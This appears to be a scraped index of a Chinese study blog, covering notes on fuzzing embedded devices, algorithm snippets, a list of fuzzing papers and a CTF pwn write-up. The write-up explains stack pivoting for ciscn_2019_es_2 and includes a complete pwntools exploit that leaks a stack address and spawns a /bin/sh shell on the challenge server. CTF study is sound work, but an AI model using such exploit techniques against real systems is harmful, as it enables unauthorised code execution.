首先介绍将在本文其余部分使用的嵌入式系统的分类。然后，我们讨论了之前将模糊测试应用于不同嵌入式设备的实验，最后我们提出了在该领域应用模糊测试所遇到的挑战。\nClasses of Embedded Devices 将嵌入式设备分为以下三类\n基于 OS 的通用设备：此类设备搭载了被改装为嵌入式设备操作系统的桌面级系统。（例如，Linux 操作系统内核广泛用于嵌入式领域，通常与轻量级用户空间环境（例如 busybox 和 uClibc）结合使用。） 基于嵌入式操作系统的设备：此类设备搭载了为嵌入式设备定制的操作系统，内核和应用程序代码之间的逻辑分离仍然存在。（例如 uClinux、ZephyrOS 和 VxWorks） 没有操作系统抽象的设备：此类设备采用所谓的“单片固件”，其操作通常基于单个控制环路和从外围设备触发的中断，以处理来自外部世界的事件。固件将包含编译的系统和应用程序代码在一起，形成了一个单一的软件。（单体方法可以在各种硬件组件控制器中找到，例如 CD 读取器、WiFi 卡或 GPS 加密狗。在这些设备上运行的代码可以是完全自定义的，也可以基于操作系统库，如 Contiki、TinyOS 或 mbed OS 22。） Past Experiments 下表展示了近几年来针对嵌入式设备 fuzzing 的论文 ^eea5b5\nMain Challenges of Fuzzing Embedded Devices Fault detection 作者认为模糊测试可以通过检测程序是否崩溃来判断输入是否触发漏洞，而桌面系统存在各种防御机制来检测恶意输入从而产生崩溃，但是嵌入式设备的操作系统没有各种各样的防御机制，所以很有可能触发漏洞但是没有产生崩溃，这种情况 fuzzing 器检测不到。 对于嵌入式设备可以检测到的崩溃，可能因为缺少输出错误信息的 I/O 功能，而导致 fuzzing 器监测不到 作者给出的解决方案是部署复杂的活性探测 主动探测：将特殊请求插入到与设备或其环境的通信中 被动探测：旨在检索有关设备状态的信息而不改变它。 Performance and Scalability 嵌入式设备的 fuzzing 难以并行化 每轮 fuzzing （为了清空状态）重启设备拖慢测试过程 Instrumentation 嵌入式设备很难进行编译时检测和运行时检测来收集覆盖信息，或者通过别的一些什么技术来收集有关被测系统状态的信息。因为对于嵌入式设备而言，测试对象往往是固件映像，现有的工具不适用，不需要访问应用程序源代码的常见解决方案是求助于二进制动态检测框架。 但是作者最后指出上述所有静态和动态检测工具都与目标操作系统和 CPU 体系结构紧密相关，并且在撰写本文时，它们都不提供对 Type-II 和 Type-III 嵌入式设备的支持。 MEMORY CORRUPTIONS IN EMBEDDED SYSTEMS Bugs, Faults, Corruptions \u0026amp; Crashes Van der Veen 等人区分了空间记忆错误和时间记忆错误。第一种类型表示对内存对象的越界访问，第二种类型表示对不再存在的内存对象的访问 有的内存损坏不会立即引起系统崩溃，作者称之为静默崩溃。 静默内存损坏的重要后果是，实际故障可能只会在稍后请求特定功能或接收到特定事件序列时才会变得明显。 桌面系统因为有多种防御机制，所以更容易触发这种静默内存损坏，但是对于嵌入式设备缺乏防御机制，很难检测到静默内存损坏 Experimental Setup 在不同的系统上触发相同的内存损坏条件，以分析它们是否屈服于可观察到的崩溃或导致静默损坏。\n设备选择：选择了现有的商用现成 (COTS) 产品：代表 Type-I 系统的路由器和代表 Type-II 设备的 IP 摄像机。 漏洞程序部署：对于 I II 型设备，直接编译漏洞程序然后加载到设备上便可，对于 III 型设备需要将测试代码包含在固件中然后对其编译，然后将固件加载到设备上。 Atificial Vulnerabilities 使用基于堆栈的缓冲区溢出和基于堆的缓冲区溢出作为空间内存损坏的示例，并使用空指针取消引用和双重释放漏洞作为时间内存损坏的示例。 还插入了一个格式字符串漏洞，可以用于信息泄漏或任意内存损坏。 Observed Behavior 桌面系统每次都可以触发崩溃 嵌入式设备并不总是能够检测到故障，在某些情况下，它们甚至继续执行而没有明显的影响——尽管系统的底层内存已损坏。观测到以下六种状态 R1：可以观测到的崩溃 R2：设备重启 R1 和 R2 对于 fuzzing 器来说是可以检测到的，是最好的结果 R3：挂起：目标挂起并停止响应新请求，可能陷入死循环 R4：随后崩溃：目标系统继续执行一段不可忽视的时间后崩溃 挂起和后期崩溃（R3 和 R4）可能更难处理，特别是当崩溃延迟足够长以至于模糊器可能已经向目标系统发送了多个其他输入并且因此导致损坏的输入将是难以识别。 R5：故障：系统没有崩溃，但是报告了错误的数据和不正常的结果 为了检测这种情况，模糊器需要知道正确的输出是什么，一种可能的变通方法包括在两个连续的输入之间插入一些输出已知的功能测试请求。然而，即使这个解决方案足以检测到故障，它也会在模糊测试中引入相当大的延迟。 R6：无影响：尽管内存已损坏，目标仍然正常运行，没有明显的副作用。 这种最难检测 MITIGATIONS Static Instrumentation. 前提是需要源代码和编译工具链 典型的 instrumentation 包括多种技术的组合：收集执行轨迹以测量覆盖率以改变模糊输入，添加内存分配检查，或使用例如控制流完整性来强化程序。不幸的是，这些工具中的大多数还不能用于嵌入式系统。 Binary Rewriting 前提要有二进制固件镜像，设备 反汇编固件的二进制镜像，恢复内存语义、边界和数据结构具有挑战性，其次嵌入式设备的内存使用经常被优化来降低成本，几乎没有留给添加复杂 instrumentation 的空间。 Physical Re-Hosting 前提需要源代码，编译链，不同的设备 某些情况下，可以将 II 型设备的系统重新编译到更易于检测的 I 型设备上，或者 I 型设备编译到桌面系统上 除了先决条件难以实现外，在不同设备上重现原设备上的漏洞也具有挑战性，由于不同的体系结构或者重新编译引入的更改可能会让原有的漏洞不再出现。 Full Emulation 前提要有固件镜像，外设模拟器 在某些情况下，从 Type-I 固件中提取的应用程序可以虚拟地重新托管，即，它们可以在默认模拟器上运行的通用操作系统中执行。 扩展 Qemu 以模拟 STM32 芯片的 Qemu STM32 项目表明，当完整的硬件文档可用时，通过相当大的努力来实现硬件模拟，也可以完全模拟 Type-III 固件映像。 这个解决方案可以大大改善模糊。首先，测试实验可以在没有物理设备的情况下进行，因此可以实现更大的并行化。其次，动态检测技术可以很容易地应用，仿真器可以用来收集大量关于运行固件的信息。 这种解决方案的缺点是，它只适用于目标所访问的所有外设都是已知的并且可以成功模拟的情况，不幸的是，这种情况很少发生。总的来说，能够在模拟器中运行任意固件仍然是一个开放的研究问题。 Partial Emulation 前提需要固件映像、设备 这种方法首先由 Avatar[54]和 Surrogates[28]提出用于 Type-III 设备，然后在 PROSPECT[24]，[25]中扩展到 Type-I 系统。此解决方案背后的一般思想是使用经过修改的模拟器 (其中执行固件代码) 将外围交互转发到实际的物理设备。其结果提供了完全模拟解决方案的优点，而无需了解和模拟 I/O 操作。然而，此解决方案在灵活性方面所获得的好处是牺牲了性能 (由于与实际设备的额外交互) 和可伸缩性 (由于当前需要将每个模拟实例与物理设备配对)。 Hardware-Supported Instrumentation 前提需要设备，高级调试功能 (例如，跟踪调试端口和调试器) 如果测试人员可以访问具有先进硬件检测机制 (如实时跟踪) 的物理设备，则可能收集足够的信息来改进设备执行期间的故障检测。例如，芯片制造商通常嵌入硬件跟踪功能，如 ARM 的嵌入式跟踪 Macrocell (ETM) 和 Coresight 调试和跟踪，或英特尔的处理器跟踪 (PT) 技术。不幸的是，这种跟踪硬件的可用性是可变的。在低端设备 (通常是 iii 型设备) 中，制造商往往不包括任何跟踪功能，因为这种机制会对芯片表面产生相对较大的影响，因此对成本也会产生影响。开发设备可能有这样的设施 (有时在制造之前在 FPGA 上测试微控制器设计)，但这在商业生产设备中不太常见。最后，在某些情况下，调试访问可能存在，但不可用，以防止第三方分析。 在测试真实设备时，找到可用的硬件跟踪支持的可能性非常低。 总结 方案 ABC 要求测试人员修改固件镜像，但是因为种种困难，在执行第三方安全测试时，这很少是一个选项。 方案 DEF 不需要修改固件镜像，但是需要额外的技术 (软件模拟器或硬件跟踪支持) 来收集有关正在运行的固件的信息。 FAULT DETECTION HEURISTICS（故障检测启发式） 这些启发式算法是独立于实现的，这样不仅可以在实时分析设置中工作 (就像固件在模拟器中运行时那样)，而且还可以对以前收集的执行跟踪进行“事后分析”(就像在基于硬件的跟踪机制中那样)。\nSegment Tracking 段跟踪可能是旨在检测非法内存访问的最简单技术。核心思想是观察所有内存读写并验证它们是否发生在有效位置，从而以某种方式模仿 MMU 检测分段错误。这种技术只需要了解目标的内存访问和内存映射。两者都可以在模拟器中轻松访问，但是，当只有跟踪可用时，可以通过逆向工程获得内存映射。\nFormat Specifier Tracking 本质上，此保护验证格式字符串说明符在进入 printf () 系列函数时指向有效位置。在最简单的情况下，如果不存在动态生成的格式字符串说明符，那些有效位置必须位于只读段内。总而言之，这项技术不仅需要了解格式处理函数的位置，还需要了解输入其中一个函数时的寄存器状态和参数顺序。相应函数的位置及其参数顺序都可以通过逆向工程或固件的自动静态分析获得。\nHeap Object Tracking 该技术旨在检测与时间和空间堆相关的错误，并受到 [43] 中介绍的检测和运行时验证方法的影响。它通过评估分配和释放函数的参数和返回值以及记录堆对象的位置和大小来实现其目标。这允许轻松检测越界内存访问或对已释放对象的访问。然而，这种启发式方法取决于多种信息：已执行的指令、寄存器的状态、内存访问以及有关分配和释放函数的知识。后者可以通过逆向工程或通过使用高级方法来发现自定义分配器来检索，如 MemBrush 所展示的。\nCall Stack Tracking 调用堆栈跟踪正在复制传统的影子堆栈保护 [53]，因此旨在检测不返回被调用者的函数。这有助于识别覆盖函数返回地址的基于堆栈的内存损坏。它通过监视所有直接和间接函数调用和返回指令来实现。然而，由于嵌入式设备通常是中断驱动的，这种试探法可能会导致漏报。但是它需要最少的信息：只需要执行指令的知识。\nCall Frame Tracking 调用帧跟踪是调用堆栈跟踪技术的更高级版本，它可以在发生时检测粗粒度的基于堆栈的缓冲区溢出，而不会出现漏报。本质上，堆栈帧是通过跟踪函数调用来定位的，然后检查连续的内存访问是否跨越堆栈帧。因此，这需要识别执行的指令以及寄存器值，以在函数入口时提取堆栈指针值。然后，必须观察内存访问以检测实际损坏。\nStack Object Tracking 堆栈对象跟踪包括对堆栈变量越界访问的细粒度检测，这是受 Serebryany 等人提出的堆对象跟踪方法的启发。 [43]。因此，根据堆栈中的各个变量大小和位置检查执行期间观察到的内存读取和写入。显然，这需要跟踪执行的指令和内存访问，以及有关堆栈变量的详尽信息。为了简单起见，我们使用调试符号中存在的变量信息。然而，在一般情况下，可以从二进制代码中以自动方式检索此类信息，正如之前的几项研究 [22]、[47] 所提出的那样。 IMPLEMENTATION 作者基于 PANDA (动态分析平台) 和 Avatar (用于嵌入式设备动态分析的编排框架)，编写了程序，并将其开源 总之，我们使用 PANDA 来模拟固件，并依赖其插件系统来获得部分或完全模拟固件执行时的实时反馈。所有这一切都由 Avatar 编排执行，并有选择地将执行和内存访问重定向到物理设备。 Avatar 还提供了保存快照的功能。 EXPERIMENTS 目的：\n将启发式方法集成到工具中 测量方法带来的系统开销 目标设置 四种实验设置：\nNAT不添加任何启发式方法的模糊测试，作为基准 PE/MF带有内存转发的部分仿真：将 I/O 操作转发到实际设备 PE/PM具有外围建模的部分仿真：固件是模拟的，外围设备交互是通过使用 Avatar 内部的专用脚本模拟外围设备行为来处理的，这允许在没有物理设备存在的情况下进行实验。 FE完全仿真：固件及其外围设备都在 PANDA 中完全模拟。 Fuzzing Setup 基于 boofuzz 构建实验 使用 fuzzer 强制生成输入这些输入将以给定的概率触发插入的内存损坏漏洞之一。 添加了一个监视器（活性检查 liveness checks）：在每次模糊输入之后，模糊器接收设备的响应并评估它是否符合预期的行为。当收到的响应与预期的不同时，或者当连接超时时，模糊器报告崩溃并重新启动目标。 这个监视器是为了检测启发式方法没有检测到的崩溃，从而评估启发式方法的有效性 Result 目标处理的输入数量 (Itot)、损坏输入被发送到目标的次数 (IC)、活性检查 (DL) 检测到的故障数量以及故障数量由启发式 (DH) 检测到。此外，我们将未检测到的故障数表示为 (DU)。 $I_C =D_L+D_H+D_U\\approx I_{tot}*P_C$ Fault Detection 实验结果表明启发式方法确实产生了更多的崩溃，从而提高了 fuzz 的效率\n性能 具有内存转发 (PE/MF) 的部分仿真正在使模糊测试减慢一个数量级以上。这种开销是由固件和设备外围设备之间的通信引入的。这种开销的主要部分是由于 Avatar 和物理设备之间的低带宽连接，它依赖于通过 USB 连接的标准 JTAG 调试器。 Surrogates [28] 已经表明，这个问题可以通过使用专用硬件来解决，这将能够以接近实时的速度进行部分仿真。 观察单个启发式，我们可以观察到它们在 PE/MF 场景中的开销可以忽略不计，其中 MMIO 请求的转发瓶颈完全决定了模糊实验的速度。然而，在 PE/PM 和 FE 场景中，我们可以观察到 PC = 0 的启发式分析代码带来了相当大的放缓 (在 x1.5 到 x6 之间)。 另一个重要的观察结果是，只要检测到的损坏量较低，针对完全模拟目标的模糊处理速度明显快于针对物理设备的模糊处理。这主要是由于三个因素。首先，TCP 上的通信比串行端口上的通信允许更高的吞吐量。第二，即使固件是仿真的，仿真器通常比 (低资源) 嵌入式设备具有更高的时钟速度。第三，检测到的损坏与强制重新启动目标有关，这意味着高容量的 pc 会导致花费大量时间重新启动，而不是向目标发送新的输入。 然而，我们实验中最重要的结果是，在启用组合启发式的 PANDA (完全仿真) 中执行的固件在 PC 的实际值下可以比原始嵌入式设备更快地模糊化。虽然第一种方法可以检测到我们在其代码中插入的所有类型的漏洞，但第二种方法需要依赖于只能识别其中两种漏洞的活动检查。 DISCUSSION 仅仅依靠活性测试是一个糟糕的策略。仅依靠活跃度测试进行故障检测来模糊嵌入式系统是一种很可能遗漏许多漏洞的糟糕策略。同样，一次只使用一个启发式方法并不能保证检测到更多的漏洞。直观地说，通过结合几种启发式方法可以达到腐败检测的最高潜力。 完全仿真模拟器很少 部分仿真速度慢——一个数量级 这项工作也适用于嵌入式设备固件上的二进制符号执行。如果没有及时检测到损坏，符号执行可能会花费大量时间来计算无用状态。 ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/what-you-corrupt-is-not-what-you-crash-challenges-in-fuzzing-embedded-devices/","summary":"你破坏的不是你破坏的: Fuzzing 嵌入式设备的挑战 作者：Marius Muench 单位：巴黎高等电信学院 国家： #法国 年份： #2018年 来源： #NDSS会议 关键字：","title":"What You Corrupt Is Not What You Crash Challenges in Fuzzing Embedded Devices"},{"content":"[[What You Corrupt Is Not What You Crash Challenges in Fuzzing Embedded Devices]] 参考：浅谈固件Fuzz_黑客技术 (hackdig.com)\n嵌入式设备分类 基于 Linux OS 的嵌入式设备：对于初次接触固件漏洞挖掘的读者往往接触的都是这类嵌入式设备，如大部分的摄像头、路由器。 自定义操作系统的嵌入式设备：可能不存在内存管理单元(MMU)，不过内核和用户层仍然存在逻辑分离。 没有抽象操作系统的嵌入式设备：编译后的代码系统空间和用户空间是混在一起的，不存在内核与用户层的逻辑分离。 参考的博客给出了这样一个观点：对这种类型的设备进行 fuzz 似乎本来就比较少见，因为该种类型的设备代码量一般较小，只用逆向说不定都可以还原。 对嵌入式设备 fuzz 的难点 错误检测：嵌入式设备的防御机制少，即使触发了漏洞，但是系统没有崩溃，fuzz 器就得不到反馈，就以为没有触发漏洞。 性能和可扩展性：难以并行，每轮都要重启设备 插桩 后续作者针对错误检测这一个问题，将嵌入式设备分为三类进行测试，将它们的反应分为了 6 种情况。![[What You Corrupt Is Not What You Crash Challenges in Fuzzing Embedded Devices#Observed Behavior]]\n启发式方法加强错误检测 段追踪 格式说明符跟踪 堆对象追踪 调用栈追踪 调用帧追踪 栈对象追踪 针对嵌入式设备 fuzz 问题的一些方法 （作者原文中对每种方法都给出了需要的工具和资源）\n静态插桩 二进制重写 物理重托管 全仿真 部分仿真 硬件支持的插桩 启示 这篇文章的主要工作在于两部分\n针对嵌入式设备缺乏错误检测机制的实验论证和解决方案 嵌入式设备 fuzzing 的现状综述 我觉得第一部分就是这篇文章的亮点，切入点很好。其次这篇文章相对于其他开发一套 fuzz 框架，或者提出某种方法的论文学术意味更强，因为工作量主要在实验上，文章最后的启发式发方法更像是展望，而不是一个具体的成果。所以说即使没有一个很好的解决方法，但是提出了问题并且证明了问题的存在也可以写一篇很好的文章。\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/3.%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/what-you-corrupt-is-not-what-you-crash-challenges-in-fuzzing-embedded-devices-%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/","summary":"[[What You Corrupt Is Not What You Crash Challenges in Fuzzing Embedded Devices]] 参考：浅谈固件Fuzz_黑客技术 (hackdig.com) 嵌入式设备分类 基于 Linux OS 的嵌入式设备：对于初次接触固件漏洞挖掘的读者往往接触的都是","title":"What You Corrupt Is Not What You Crash Challenges in Fuzzing Embedded Devices 总结笔记"},{"content":"前缀和 1 2 3 4 5 //构建前缀和数组 for (int i = 1; i \u0026lt;= n; i ++ ) s[i] = x + s[i - 1]; //计算某n个连续的数的和 sum = s[i] - s[i - n]; 前缀和矩阵 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 //构建前缀和矩阵 for (int i = 1; i \u0026lt;= n; i ++ ) for (int j = 1; j \u0026lt;= n; j ++ ) { int x; scanf(\u0026#34;%d\u0026#34;, \u0026amp;x); s[i][j] = x + s[i - 1][j] + s[i][j - 1] - s[i - 1][j - 1]; } //计算矩阵块的和 int get_sum(int x1, int y1, int x2, int y2) { return s[x2][y2] - s[x1 - 1][y2] - s[x2][y1 - 1] + s[x1 - 1][y1 - 1]; } //计算矩阵块的大小 int get_cnt(int x1, int y1, int x2, int y2) { return (x2 - x1 + 1) * (y2 - y1 + 1); } ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/%E5%89%8D%E7%BC%80%E5%92%8C%E5%89%8D%E7%BC%80%E5%92%8C%E7%9F%A9%E9%98%B5/","summary":"前缀和 1 2 3 4 5 //构建前缀和数组 for (int i = 1; i \u0026lt;= n; i ++ ) s[i] = x + s[i - 1]; //计算某n个连续的数的和 sum = s[i] - s[i - n]; 前缀和矩阵 1 2 3 4 5 6 7 8 9 10","title":"前缀和（前缀和矩阵）"},{"content":" (32条消息) 最新zotero与obsidian笔记联动教程（可代替citations和mdnotes）_qq_43309940的博客-CSDN博客_obsidian和zotero 这篇博客提供了zotero和obsidian联动的方案，功能大概就是可以在obsidian中一键新建论文对应的笔记文档，同时将zotero中的注释同步到obsidian中 缺点1：模板不太适合我，等到后面我的论文笔记形成模式后自己写一下模板 缺点2：文档冗余信息多，关于论文的一些基本信息从zotero中就可以看，没必要同步到笔记中 缺点3：我不习惯直接在论文上做注释，所以注释同步到笔记中这个功能对我来说没啥用 ","permalink":"https://juhuax.github.io/posts/study/3.%E6%9D%82/%E5%90%8E%E7%BB%AD%E5%8F%AF%E8%83%BD%E6%9C%89%E7%94%A8%E7%9A%84%E8%B5%84%E6%96%99/","summary":"(32条消息) 最新zotero与obsidian笔记联动教程（可代替citations和mdnotes）_qq_43309940的博客-CS","title":"后续可能有用的资料"},{"content":"参考：(17条消息) 差分 \u0026ndash;算法竞赛专题解析（32）罗勇军的博客-CSDN博客\n","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/%E5%B7%AE%E5%88%86/","summary":"参考：(17条消息) 差分 \u0026ndash;算法竞赛专题解析（32）罗勇军的博客-CSDN博客","title":"差分"},{"content":"参考：栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com)（这篇写的及其详细）\n适用场景 当栈上的空间，或者程序的输入字符数量不够我们进行溢出操作的时候，可以进行栈迁移。比如一般栈溢出的题目都会有一个字符串数组，当程序在读入我们的输入的时候将读取的字符数量写死的时候，可能我们就没有足够的空间去填入 ROP 链。\n概述 栈迁移顾名思义就是将原来的程序栈迁移到另一个地方，使得我们可以将构造的 ROP 链完整的填入。 那么想要修改栈的位置，那么就需要修改寄存器 esp 和 ebp 的值。 想要修改 esp 和 ebp 的值，我们需要用到 leave 和 ret 两个 gadget。\n原理 leave \u0026amp; ret leave 命令由两句汇编指令组成：mov esp, ebp和pop ebp 它将 ebp 的值交给 esp，然后将栈顶的值弹给 ebp。操作结束后 esp 的值是 old ebp+4，ebp 的值是*old ebp ret 命令是 pop rip 将栈顶的值弹给 rip\n两次 leave\u0026amp;ret 我们可以看到 leave 命令可以修改 esp 和 ebp 寄存器，但是只用一次 leave 是无法同时修改 esp 和 ebp 的。因为当我们将栈上的数据覆盖后，执行 leave，只能将栈上的数据 pop 给 ebp，而 esp 没有办法修改。所以我们需要进行两次 leave。\n首先我们对栈进行覆盖，将此时 ebp 指向的位置（也就是上一个栈帧的 ebp）覆盖为栈迁移的目的地址 a（未来 esp 中的值），return 位置覆盖为 leave\u0026amp;ret 的地址。 然后程序开始执行，因为当前函数执行结束时本来就要执行一个 leave\u0026amp;ret，所以进行mov esp, ebp和pop ebp，此时 esp 中的值正常，ebp 的值变为目标地址 a（因为将栈上的地址弹到 ebp 了） 接着执行 ret（pop rip），因为此时 return 的值被我们覆盖为 leave\u0026amp;ret 的地址，所以程序会再次执行一次 leave\u0026amp;ret。leave 执行结束后，esp 中的值是目标地址 a+4（因为还 pop ebp 了一次），ebp 的值无所谓。接着执行 ret，执行结束后 rip 的值是目标地址 a+4 中的值。 迁移成功。 此时，可能就会存在疑问，所以呢？迁移结束了又能怎样。实际上栈迁移只是我们攻击的一个步骤，目的就是将程序的执行流劫持到目标地址 a 处（在上面的步骤中实际上应该是 a+4 处，但是我只是说这么个意思，无伤大雅）。在栈迁移之前，我们已经将目标地址处覆盖为了我们要执行的代码的地址，并且构造了 ROP 链，这样就可以实现我们的攻击了。\n例题 ciscn_2019_es_2 这个题的 read 函数写死了读入 0x30 个字符，我们可以看到变量 s 距离 ebp 是 0x28 个字节，所以按照普通的方法，我们构造 payload 是 (0x28 + 4) * \u0026lsquo;a\u0026rsquo; + ret_addr，这已经 0x30 个字符了，根本不够用。 所以我们考虑栈迁移\nstep 1 寻找目标地址 我们要确定目标地址是哪里，这个题中我们可以将 s 作为目标地址。那么我们需要知道 s 确切的地址。 如何获得 s 的地址呢，我们观察一下 vlu 函数的栈：\n打开 gdb，在 main 函数处下断点，找一下 vul 函数的地址 在 vul 函数处下断点，然后单步步入，进入函数 vul 查看一下 vul 的汇编 因为我们想要知道 s 的地址，所以我们先输入字符‘aaaa’，然后看看栈中的情况 在 printf 函数前打个断点，因为要先执行一个 read 函数输入‘aaaa’ 我们观察栈中的情况，eax 和 ecx 指向的地方就是 s 的地址，但是这个地址是我们本地地址，你要打远程主机不能用这个。所以我们要想方法暴露一个栈上的地址 x，然后算 x 和 s 的偏移 y，那么 s 的地址就是 x+y。 我们可以看到 ebp 指向的地方存了一个地址 0xffffd 008，这是上一个栈帧的 ebp，它距离 s 的地址的偏移是 56。那么如果可以将它暴露，就可以求得 s 的地址了。 程序中有 printf 函数，该函数在未遇到终止符 \u0026lsquo;\\0\u0026rsquo;时会一直输出，那么我们可以利用 printf 将栈上的值输出，得到 ebp 指向的值。 1 2 3 4 5 6 7 8 9 from pwn import * p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, 26588) payload1 = b\u0026#39;a\u0026#39; * 0x27 + b\u0026#39;b\u0026#39; p.send(payload1) # sendline会有终止符 p.recvuntil(\u0026#39;b\u0026#39;) s_addr = u32(p.recv(4)) - 56 print(hex(s_addr)) step 2 构造 payload 要实现栈迁移，只要把 ebp 和 return 位置覆盖为目标地址和 leave\u0026amp;ret 地址就 ok 了。那么迁移后的 fake 栈上应该如何布局呢。 程序中有 system 函数，但是没有 bin/sh 字符串。那么 fake 栈应该这样布局： system_addr + fake_ret + bin_sh_addr + bin_sh_str 综上所述，最终的 payload 应该是 ‘aaaa’ + system_addr + fake_ret + bin_sh_addr + bin_sh_str + padding + s_addr + leave\u0026amp;ret_addr 最前面的 4 个字节的 aaaa 是为了抵消掉 leave 指令中 pop ebp 导致的 esp 上移，中间的 padding 是为了补全 0x28 个字节。 完整的 exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from pwn import * p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, 26588) payload1 = b\u0026#39;a\u0026#39; * 0x27 + b\u0026#39;b\u0026#39; p.send(payload1) # sendline会有终止符 p.recvuntil(\u0026#39;b\u0026#39;) s_addr = u32(p.recv(4)) - 56 print(\u0026#39;s_addr: \u0026#39;, hex(s_addr)) system_addr = 0x08048400 leave_ret = 0x080484b8 payload2 = b\u0026#39;aaaa\u0026#39; + p32(system_addr) + b\u0026#39;aaaa\u0026#39; payload2 = payload2 + p32(s_addr + 0x10) payload2 = payload2 + b\u0026#39;/bin/sh\\x00\u0026#39; payload2 = payload2.ljust(0x28, b\u0026#39;a\u0026#39;) payload2 = payload2 + p32(s_addr) + p32(leave_ret) p.sendline(payload2) p.interactive() 注意 payload2 中 bin/sh 字符串要加终止符\n","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E6%A0%88%E8%BF%81%E7%A7%BB/","summary":"参考：栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com)（这篇写的及其详细） 适用场景 当栈上的空间，或者程序的输入字符数量不够我们进行","title":"栈迁移"},{"content":"2023-06-22 16:07 L2Fuzz: Discovering Bluetooth L2CAP Vulnerabilities Using Stateful Fuzz Testing.\tDSN\t2022\n关于蓝牙设备的fuzz 解决的问题：不能有效地生成蓝牙的畸形数据包 本文提出的方法生成的畸形数据包数量增加了46倍，数据包拒绝率大大降低；从八个真实蓝牙设备中检测到五个零日漏洞 Torpedo: A Fuzzing Framework for Discovering Adversarial Container Workloads.\tDSN\t2022\n提出一种方法检测容器中异常的工作负载 Towards Fuzzing Target Lines.\tDSN\t2022\n在本文中，我们建议改进这些想法，使模糊器专注于代码的特定部分 (即行)，我们称之为目标，避免在其他区域浪费资源。 FUZZILLI: Fuzzing for JavaScript JIT Compiler Vulnerabilities.\tNDSS\t2023\n先前的研究不是为了生成真正触发JIT语义的源代码而设计的。 提出了第一个专注于JIT漏洞的模糊器 No Grammar, No Problem: Towards Fuzzing the Linux Kernel without System-Call Descriptions.\tNDSS\t2023\n先前的研究syzkaller 过于依赖语法 FuzzNG不需要复杂的系统调用接口描述来实现功能。相反，FuzzNG利用基本的内核设计特性来重塑和简化模糊器的输入空间。对于每个新目标，FuzzNG只需要一个小的配置: 本质上是fuzzer应该探索的文件和系统调用号列表。 DARWIN: Survival of the Fittest Fuzzing Mutators.\tNDSS\t2023\n先前研究的fuzz对种子调度优化效果不明显、突变调度需要的专业知识太多 提出一种新的突变调度器不需要引入用户可配置参数 LOKI: State-Aware Fuzzing Framework for the Implementation of Blockchain Consensus Protocols.\tNDSS\t2023\n现有fuzz无法处理分布式结点的复杂共识状态，从而产生大量无用的数据包 提出了一共共识协议模糊框架 FuzzOrigin: Detecting UXSS vulnerabilities in Browsers through Origin Fuzzing\tUSENIX\t2022\n难以使用模糊测试检测uxss漏洞：uxss是个语义漏洞、很难生成触发UXSS的HTML输入，因为需要驱动浏览器执行复杂的交互和导航 提出了一种用于检测UXSS漏洞的浏览器模糊器FuzzOrigin BrakTooth: Causing Havoc on Bluetooth Link Manager via Directed Fuzzing\tUSENIX\t2022\n定向模糊蓝牙 AmpFuzz: Fuzzing for Amplification DDoS Vulnerabilities\tUSENIX\t2022\n针对DDOS的模糊测试 Morphuzz: Bending (Input) Space to Fuzz Virtual Devices\tUSENIX\t2022 Fuzzware: Using Precise MMIO Modeling for Effective Firmware Fuzzing\tUSENIX\t2022 MundoFuzz: Hypervisor Fuzzing with Statistical Coverage Testing and Grammar Inference\tUSENIX\t2022\n一个虚拟机监控程序模糊器，可以实现覆盖引导和语法感知的模糊测试。 Drifuzz: Harvesting Bugs in Device Drivers from Golden Seeds\tUSENIX\t2022\n提出一种针对WIFI和以太网驱动程序的无硬件符号执行增强模糊器 提出一种生成高质量初始种子的技术，该技术允许模糊测试在驱动程序初始化期间绕过困难的代码结构 SGXFuzz: Efficiently Synthesizing Nested Structures for SGX Enclave Fuzzing\tUSENIX\t2022\n针对sgx的fuzz SyzScope: Revealing High-Risk Security Impacts of Fuzzer-Exposed Bugs in Linux kernel\tUSENIX\t2022\n先前研究忽略了对安全影响的评估，缺乏对安全影响的理解可能导致错误修复延迟以及补丁传播。 开发了syzscope，可以从看似低风险的bug中自动发现高风险影响 TheHuzz: Instruction Fuzzing of Processors Using Golden-Reference Models for Finding Software-Exploitable Vulnerabilities\tUSENIX\t2022\n提出一种针对硬件的模糊器 Fuzzing Hardware Like Software\tUSENIX\t2022\n将RTL硬件转换为软件模型，并以软件模糊的方法区模糊该模型 主要是针对芯片的模糊 Stateful Greybox Fuzzing\tUSENIX\t2022\n一个关键的挑战是在没有显式协议规范的情况下覆盖状态空间。 没看懂摘要说的啥 StateFuzz: System Call-Based State-Aware Linux Driver Fuzzing\tUSENIX\t2022\n作者认为现有的覆盖率指导的模糊测试者通常倾向于使用新代码的测试用例，而放弃使用相同代码的测试用例。然而，这样的策略并不是最优的。使用相同代码的新测试用例可能比以前的测试用例更好，因为它可能触发对代码探索和bug发现有用的新程序状态。 评估了覆盖引导模糊解决方案的局限性，并提出了一个状态感知模糊解决方案StateFuzz来解决这个问题。 FIXREVERTER: A Realistic Bug Injection Methodology for Benchmarking Fuzz Testing\tUSENIX\t2022\n为了评估模糊测试器的效果，本文介绍了FIXREVERTER，一个自动在程序中注入真实错误的工具。 JIGSAW: Efficient and Scalable Path Constraints Fuzzing\tS\u0026amp;P\t2022\n对覆盖引导的fuzz的提高，主要是提高fuzz的吞吐量 BEACON: Directed Grey-Box Fuzzing with Provable Path Pruning\tS\u0026amp;P\t2022\n提前修剪不可达路径 FuzzUSB: Hybrid Stateful Fuzzing of USB Gadget Stacks\tS\u0026amp;P\t2022\n对USB的fuzz PATA: Fuzzing with Path Aware Taint Analysis\tS\u0026amp;P\t2022\n通过污点分析来加强fuzz Effective Seed Scheduling for Fuzzing with Graph Centrality 